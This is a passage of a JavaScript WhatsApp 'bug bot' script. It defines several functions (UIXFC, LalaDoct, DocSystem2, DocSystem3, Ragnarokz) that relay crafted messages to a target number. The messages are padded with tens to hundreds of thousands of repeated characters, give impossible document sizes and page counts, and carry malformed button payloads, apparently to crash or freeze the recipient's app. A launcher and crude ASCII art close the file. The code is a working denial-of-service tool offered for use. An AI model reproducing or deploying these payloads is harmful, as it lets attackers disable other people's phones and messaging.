                                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                fileName: "https://xnxxx.com",
                                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1724474503",
                                contactVcard: true,
                                thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                jpegThumbnail: ""
                            }
                        }
                    }
                }
            }
        }
    };

    await Zeph.relayMessage(target, message, { participant: { jid: target } });
}
async function UIXFC(target) {
    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2,
                },
                interactiveMessage: {
                    contextInfo: {
                        mentionedJid: [target],
                        isForwarded: true,
                        forwardingScore: 999,
                        businessMessageForwardInfo: {
                            businessOwnerJid: target
                        },
                    },
                    body: {
                        text: "𝗖𝗼𝘀𝗺𝗼 𝗻𝗶𝗵 𝗱𝗲𝗸" + "ꦽ".repeat(45000),
                    },
                    nativeFlowMessage: {
                        buttons: [{
                                name: "single_select",
                                buttonParamsJson: "",
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "",
                            },
                            {
                                name: "mpm",
                                buttonParamsJson: "",
                            },
                        ],
                    },
                },
            },
        },
    };

    await Zeph.relayMessage(target, message, {
        participant: {
            jid: target
        },
    });
  console.log(chalk.red("UIXFC SUCCES SENDED"));    
}
async function LalaDoct(target) {
                   await Zeph.relayMessage(target, {
                           groupMentionedMessage: {
                                   message: {
                                           interactiveMessage: {
                                                   header: {
                                                           documentMessage: {
                                                                   url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                                                   mimetype: "application/pdf",
                                                                   fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                                                   fileLength: "1099511627776",
                                                                   pageCount: 199183729199991,
                                                                   mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                                                   fileName: "Open VCS",
                                                                   fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                                                   directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                                                   mediaKeyTimestamp: "1728631701",
                                                                   contactVcard: true
                                                           },
                                                           hasMediaAttachment: true
                                                   },
                                                   body: {
                                                           text: "\u0000" + "ꦿꦸ".repeat(50000) + "@1".repeat(70000),
                                                   },
                                                   nativeFlowMessage: {
                                                           messageParamsJson: "Open VCS",
                                                           "buttons": [{
                                                                   "name": "review_and_pay",
                                                                   "buttonParamsJson": "{\"currency\":\"IDR\",\"total_amount\":{\"value\":2000000,\"offset\":100},\"reference_id\":\"4R0F79457Q7\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":0,\"offset\":100},\"order_type\":\"PAYMENT_REQUEST\",\"items\":[{\"retailer_id\":\"custom-item-8e93f147-12f5-45fa-b903-6fa5777bd7de\",\"name\":\"sksksksksksksks\",\"amount\":{\"value\":2000000,\"offset\":100},\"quantity\":1}]},\"additional_note\":\"sksksksksksksks\",\"native_payment_methods\":[],\"share_payment_status\":false}"
                                                           }]
                                                   },
                                                   contextInfo: {
                                                           mentionedJid: Array.from({
                                                                   length: 5
                                                           }, () => "120363404154098043@newsletter"),
                                                           groupMentions: [{
                                                                   groupJid: "120363404154098043@newsletter",
                                                                   groupSubject: "Open VCS"
                                                           }]
                                                   }
                                           }
                                   }
                           }
                   }, {
                           participant: {
                                   jid: target
                           }
                   });
                   console.log("Send Bug By Hades");
           }
async function DocSystem2(target) {
            Zeph.relayMessage(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/pdf",
                                fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                                fileLength: "1991837291999",
                                pageCount: 199183729199991,
                                mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                                fileName: "DocumentDpr",
                                fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                                directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1728631701",
                                contactVcard: true,
                                caption: " ꦾ".repeat(70000) + "ꦾ".repeat(50000),
                                contextInfo: {
                                    mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                    groupMentions: [{ groupJid: "1@newsletter", groupSubject: "War" }],
                                    isForwarded: true,
                                    quotedMessage: {
                                        interactiveResponseMessage: {
                                            body: {
                                                text: "饝箔饝箔饾棩饾棶饾棿饾",
                                                format: "DEFAULT"
                                            },
                                            nativeFlowResponseMessage: {
                                                name: "galaxy_message",
                                                paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "Dimzxzzx",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "cyber@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(70000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
"screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`, 
                                                version: 3
                                            },
                                        }
                                    }
                                }
                            }
                        }
                    }
                },
                { participant: { jid: target } }
            );
        };

async function DocSystem3(target) {
            Zeph.relayMessage(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: "Document Kominfo",
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                title: "ꦾꦾꦾꦾꦾꦾꦾ",
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "饝箔饝箔饾棩饾棶饾棿饾"
                            },
                            nativeFlowMessage: {
                                buttons: [
                                    {
                                        name: 'call_permission_request',
                                        buttonParamsJson: '{}'
                                    }
                                ]
                            },
                            contextInfo: {
                                quotedMessage: {
                                    interactiveResponseMessage: {
                                        body: {
                                            text: "Preditcs 👋",
                                            format: "DEFAULT"
                                        },
                                        nativeFlowResponseMessage: {
                                            name: "galaxy_message",
                                            paramsJson: `{
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "Dimzxzzx",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "cyber@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "radio - buttons${"ꦾ".repeat(50000)}",
                "screen_0_TextInput_1": "Why?",
                "screen_0_Dropdown_2": "001-Grimgar",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                            version: 3
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }, { participant: { jid: target } }, { messageId: null });
};
async function Ragnarokz(target) {
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "饝箔饝箔饾棩饾棶饾棿饾椈饾棶饾椏饾椉饾椄 饾棲饾棾饾椂饾椈饾椂饾榿饾槅馃└\n",
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "饝箔饝箔饾棩饾棶饾棿饾椈饾棶饾椏饾椉饾椄 饾棲饾棾饾椂饾椈饾椂饾榿饾槅馃└",
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "\u0000"
                            },
                            {
                                name: "galaxy_message",
                                buttonParamsJson: `{\"screen_2_OptIn_0\":true,           \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"饝箔饝箔饾棩饾棶饾棿饾椈饾棶饾椏饾椉饾椄 饾棲饾棾饾椂饾椈饾椂饾榿饾槅馃└\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"DapzNotDev@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(355000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                            }
                        ]
                    }
                }
            }
        }
    }, {});

    await Zeph.relayMessage(target, msg.message, { participant: { jid: target } }, { messageId: null });
}

// --- Jalankan Bot ---
 
(async () => {
    console.clear();
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses connected");
    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses
    console.clear();
    console.log(chalk.bold.white(`\n
⣿⣿⣷⡁⢆⠈⠕⢕⢂⢕⢂⢕⢂⢔⢂⢕⢄⠂⣂⠂⠆⢂⢕⢂⢕⢂⢕⢂⢕⢂
⣿⣿⣿⡷⠊⡢⡹⣦⡑⢂⢕⢂⢕⢂⢕⢂⠕⠔⠌⠝⠛⠶⠶⢶⣦⣄⢂⢕⢂⢕
⣿⣿⠏⣠⣾⣦⡐⢌⢿⣷⣦⣅⡑⠕⠡⠐⢿⠿⣛⠟⠛⠛⠛⠛⠡⢷⡈⢂⢕⢂
⠟⣡⣾⣿⣿⣿⣿⣦⣑⠝⢿⣿⣿⣿⣿⣿⡵⢁⣤⣶⣶⣿⢿⢿⢿⡟⢻⣤⢑⢂
⣾⣿⣿⡿⢟⣛⣻⣿⣿⣿⣦⣬⣙⣻⣿⣿⣷⣿⣿⢟⢝⢕⢕⢕⢕⢽⣿⣿⣷⣔
⣿⣿⠵⠚⠉⢀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣗⢕⢕⢕⢕⢕⢕⣽⣿⣿⣿⣿
⢷⣂⣠⣴⣾⡿⡿⡻⡻⣿⣿⣴⣿⣿⣿⣿⣿⣿⣷⣵⣵⣵⣷⣿⣿⣿⣿⣿⣿⡿
⢌⠻⣿⡿⡫⡪⡪⡪⡪⣺⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃
⠣⡁⠹⡪⡪⡪⡪⣪⣾⣿⣿⣿⣿⠋⠐⢉⢍⢄⢌⠻⣿⣿⣿⣿⣿⣿⣿⣿⠏⠈
⡣⡘⢄⠙⣾⣾⣾⣿⣿⣿⣿⣿⣿⡀⢐⢕⢕⢕⢕⢕⡘⣿⣿⣿⣿⣿⣿⠏⠠⠈
⠌⢊⢂⢣⠹⣿⣿⣿⣿⣿⣿⣿⣿⣧⢐⢕⢕⢕⢕⢕⢅⣿⣿⣿⣿⡿⢋⢜⠠⠈
⠄⠁⠕⢝⡢⠈⠻⣿⣿⣿⣿⣿⣿⣿⣷⣕⣑⣑⣑⣵⣿⣿⣿⡿⢋⢔⢕⣿⠠⠈
⠨⡂⡀⢑⢕⡅⠂⠄⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⢔⢕⢕⣿⣿⠠⠈
⠄⠪⣂⠁⢕⠆⠄⠂⠄⠁⡀⠂⡀⠄⢈⠉⢍⢛⢛⢛⢋⢔⢕⢕⢕⣽⣿⣿⠠⠈
AH AH AH ENAK SAYANG⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`));
})();
